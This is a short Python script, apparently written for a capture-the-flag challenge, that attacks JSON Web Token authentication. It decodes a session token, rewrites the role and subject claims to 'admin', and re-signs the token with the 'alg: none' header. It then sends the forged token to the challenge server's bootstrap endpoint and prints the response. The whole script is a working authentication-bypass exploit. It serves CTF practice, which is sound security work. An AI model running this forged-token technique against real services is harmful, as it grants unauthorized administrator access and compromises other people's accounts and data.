from client import GhostClient
import requests
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

c = GhostClient()
c.bootstrap()

# Parse token header and payload
header_b64, payload_b64, sig_b64 = c.token.split('.')
def pad_b64(s): return s + '=' * ((4 - len(s) % 4) % 4)
header = json.loads(base64.urlsafe_b64decode(pad_b64(header_b64)))
payload = json.loads(base64.urlsafe_b64decode(pad_b64(payload_b64)))

print("Original Header:", header)
print("Original Payload:", payload)

# Test 1: alg: none
payload_admin = dict(payload)
payload_admin["role"] = "admin"
payload_admin["sub"] = "admin"

h_none = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
p_admin = base64.urlsafe_b64encode(json.dumps(payload_admin).encode()).decode().rstrip('=')
jwt_none = f"{h_none}.{p_admin}."

# Test sending JWT none to bootstrap
resp = c.session.post(
    "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf/api/transport/bootstrap",
    headers={
        "Accept": "application/json",
        "Authorization": f"Bearer {jwt_none}",
        "Content-Type": "application/json"
    },
    json={"clientPublicKey": {}}
)
print("alg none response:", resp.status_code, resp.text)
